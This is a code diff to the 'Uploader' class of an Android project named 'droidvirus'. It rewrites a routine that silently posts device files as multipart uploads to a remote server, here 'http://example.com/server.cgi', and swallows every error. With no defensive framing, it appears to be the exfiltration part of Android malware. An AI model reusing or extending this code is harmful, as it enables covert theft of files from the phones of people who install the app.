@@ -2,13 +2,12 @@ package com.artisanter.droidvirus;
 
 import android.content.Context;
 
-import org.apache.http.HttpEntity;
-import org.apache.http.client.methods.HttpPost;
-import org.apache.http.entity.ContentType;
-import org.apache.http.impl.client.DefaultHttpClient;
-import org.apache.http.entity.mime.MultipartEntityBuilder;
-
+import java.io.DataOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
 class Uploader {
     static void uploadAll(Context context){
@@ -18,16 +17,53 @@ class Uploader {
         }
     }
     private static void postFile(final String fileName, final File file) {
-        DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
-        HttpPost httpPost = new HttpPost(ServiceUrl.URL);
+        String crlf = "\r\n";
+        String twoHyphens = "--";
+        String boundary = "*****";
         try {
-            HttpEntity httpEntity = MultipartEntityBuilder.create()
-                    .addBinaryBody(fileName, file, ContentType.MULTIPART_FORM_DATA, fileName).build();
-            httpPost.setEntity(httpEntity);
-            httpPost.setHeader("Accept", "application/json");
-            httpPost.setHeader("Accept-Encoding", "gzip");
+            HttpURLConnection httpUrlConnection;
+            URL url = new URL("http://example.com/server.cgi");
+            httpUrlConnection = (HttpURLConnection) url.openConnection();
+            httpUrlConnection.setUseCaches(false);
+            httpUrlConnection.setDoOutput(true);
 
-            defaultHttpClient.execute(httpPost);
-        } catch (Exception ignored) {}
+            httpUrlConnection.setRequestMethod("POST");
+            httpUrlConnection.setRequestProperty("Connection", "Keep-Alive");
+            httpUrlConnection.setRequestProperty("Cache-Control", "no-cache");
+            httpUrlConnection.setRequestProperty(
+                    "Content-Type", "multipart/form-data;boundary=" + boundary);
+            DataOutputStream request = new DataOutputStream(
+                    httpUrlConnection.getOutputStream());
+
+            request.writeBytes(twoHyphens + boundary + crlf);
+            request.writeBytes("Content-Disposition: form-data; name=\"" +
+                    fileName + "\";filename=\"" +
+                    fileName + "\"" + crlf);
+            request.writeBytes(crlf);
+
+            byte[] bytes = toByteArray(file);
+            request.write(bytes);
+            request.writeBytes(crlf);
+            request.writeBytes(twoHyphens + boundary + twoHyphens + crlf);
+            request.flush();
+            request.close();
+        } catch (Exception ignored) {
+        }
+
+    }
+
+    private static byte[] toByteArray(File file){
+        FileInputStream fis;
+        byte[] bArray = new byte[(int) file.length()];
+        try{
+            fis = new FileInputStream(file);
+            fis.read(bArray);
+            fis.close();
+
+        }catch(IOException ioExp){
+            ioExp.printStackTrace();
+        }
+        return bArray;
     }
 }
+
